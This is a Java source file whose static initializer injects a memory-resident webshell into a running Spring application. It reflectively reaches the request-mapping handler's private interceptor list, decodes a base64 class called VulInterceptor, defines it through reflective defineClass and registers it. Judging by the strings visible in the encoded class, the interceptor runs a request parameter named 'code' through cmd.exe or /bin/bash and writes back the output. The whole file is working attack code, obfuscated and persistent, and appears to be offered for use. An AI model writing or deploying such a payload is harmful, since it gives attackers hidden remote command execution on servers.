import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.ServletContext;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;


public class TouchFilea {
    static {
        ServletContext sss = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest().getSession().getServletContext();
        org.springframework.web.context.WebApplicationContext context  = org.springframework.web.context.support.WebApplicationContextUtils.getWebApplicationContext(sss);
        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
        java.lang.reflect.Field field = null;
        try {
            field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        field.setAccessible(true);
        java.util.ArrayList<Object> adaptedInterceptors = null;
        try {
            adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        String className = "VulInterceptor";
        String b64 = "yv66vgAAADQAmQoAIgBTCAA9CwBUAFULAFYAVwgAWAoAWQBaCgALAFsIAFwKAAsAXQcAXgcAXwgAYAgAYQoACgBiCQBZAGMKAGQAZQgAZggAZwoACgBoCgAKAGkHAGoHAGsKAGwAbQoAFgBuCgAVAG8KABUAcAoAcQBlCgBxAHIKAHEAcwcAdAsAIwB1CwAjAHYHAHcHAHgHAHkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEExWdWxJbnRlcmNlcHRvcjsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQAHYnVpbGRlcgEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABcAEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAFyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2hhbmRsZXIBABJMamF2YS9sYW5nL09iamVjdDsBAARjb2RlAQANU3RhY2tNYXBUYWJsZQcAXwcAegcAXgcAdwcAewcAfAcAeAcAdAEACkV4Y2VwdGlvbnMBABBNZXRob2RQYXJhbWV0ZXJzAQAKcG9zdEhhbmRsZQEAkihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvTW9kZWxBbmRWaWV3OylWAQAMbW9kZWxBbmRWaWV3AQAuTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvTW9kZWxBbmRWaWV3OwEAD2FmdGVyQ29tcGxldGlvbgEAeShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9FeGNlcHRpb247KVYBAAJleAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAClNvdXJjZUZpbGUBABNWdWxJbnRlcmNlcHRvci5qYXZhDAAkACUHAHsMAH0AfgcAfAwAfwCAAQAHb3MubmFtZQcAgQwAggB+DACDAIQBAAN3aW4MAIUAhgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACQAhwwAiACJBwCKDACLAIwBAAkvYmluL2Jhc2gBAAItYwwAjQCODACPAJABABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcAkQwAkgCTDAAkAJQMACQAlQwAlgCEBwB6DACXACUMAJgAJQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAEkASgwATQBOAQAOVnVsSW50ZXJjZXB0b3IBABBqYXZhL2xhbmcvT2JqZWN0AQAyb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9IYW5kbGVySW50ZXJjZXB0b3IBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAE3JlZGlyZWN0RXJyb3JTdHJlYW0BAB0oWilMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAFZmx1c2gBAAVjbG9zZQAhACEAIgABACMAAAAEAAEAJAAlAAEAJgAAAC8AAQABAAAABSq3AAGxAAAAAgAnAAAABgABAAAACQAoAAAADAABAAAABQApACoAAAABACsALAADACYAAAHGAAYACgAAALYrEgK5AAMCADoEGQTGAKgsuQAEAQA6BRIFuAAGtgAHEgi2AAmZACK7AApZBr0AC1kDEgxTWQQSDVNZBRkEU7cADjoGpwAnsgAPGQS2ABC7AApZBr0AC1kDEhFTWQQSElNZBRkEU7cADjoGGQYEtgATVxkGtgAUOge7ABVZuwAWWRkHtgAXtwAYtwAZOggZCLYAGjoJsgAPGQm2ABAZBRkJtgAbGQW2ABwZBbYAHacABToFA6wErAABAA8ArQCwAB4AAwAnAAAATgATAAAADAAKAA0ADwAPABcAEQAnABIARgAUAE4AFQBqABcAcQAYAHgAGQCNABoAlAAbAJwAHACjAB0AqAAeAK0AIACwAB8AsgAhALQAIwAoAAAAcAALAEMAAwAtAC4ABgAXAJYALwAwAAUAagBDAC0ALgAGAHgANQAxADIABwCNACAAMwA0AAgAlAAZADUANgAJAAAAtgApACoAAAAAALYANwA4AAEAAAC2ADkAOgACAAAAtgA7ADwAAwAKAKwAPQA2AAQAPgAAACwABf0ARgcAPwcAQPwAIwcAQf8ARQAFBwBCBwBDBwBEBwBFBwA/AAEHAEYBAQBHAAAABAABAB4ASAAAAA0DADcAAAA5AAAAOwAAAAEASQBKAAMAJgAAAGAABQAFAAAACiorLC0ZBLcAH7EAAAACACcAAAAKAAIAAAAoAAkAKQAoAAAANAAFAAAACgApACoAAAAAAAoANwA4AAEAAAAKADkAOgACAAAACgA7ADwAAwAAAAoASwBMAAQARwAAAAQAAQAeAEgAAAARBAA3AAAAOQAAADsAAABLAAAAAQBNAE4AAwAmAAAAYAAFAAUAAAAKKissLRkEtwAgsQAAAAIAJwAAAAoAAgAAAC0ACQAuACgAAAA0AAUAAAAKACkAKgAAAAAACgA3ADgAAQAAAAoAOQA6AAIAAAAKADsAPAADAAAACgBPAFAABABHAAAABAABAB4ASAAAABEEADcAAAA5AAAAOwAAAE8AAAABAFEAAAACAFI="; // magicInterceptor 类 class 的 base64 编码
        byte[] bytes = new byte[0];
        try {
            bytes = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(b64);
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        try {
            classLoader.loadClass(className);
        }catch (ClassNotFoundException e){
            java.lang.reflect.Method m0 = null;
            try {
                m0 = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
            } catch (NoSuchMethodException noSuchMethodException) {
                noSuchMethodException.printStackTrace();
            }
            m0.setAccessible(true);
            try {
                m0.invoke(classLoader, className, bytes, 0, bytes.length);
            } catch (IllegalAccessException illegalAccessException) {
                illegalAccessException.printStackTrace();
            } catch (InvocationTargetException invocationTargetException) {
                invocationTargetException.printStackTrace();
            }
            try {
                adaptedInterceptors.add(classLoader.loadClass(className).newInstance());
            } catch (InstantiationException instantiationException) {
                instantiationException.printStackTrace();
            } catch (IllegalAccessException illegalAccessException) {
                illegalAccessException.printStackTrace();
            } catch (ClassNotFoundException classNotFoundException) {
                classNotFoundException.printStackTrace();
            }
        }
    }
}
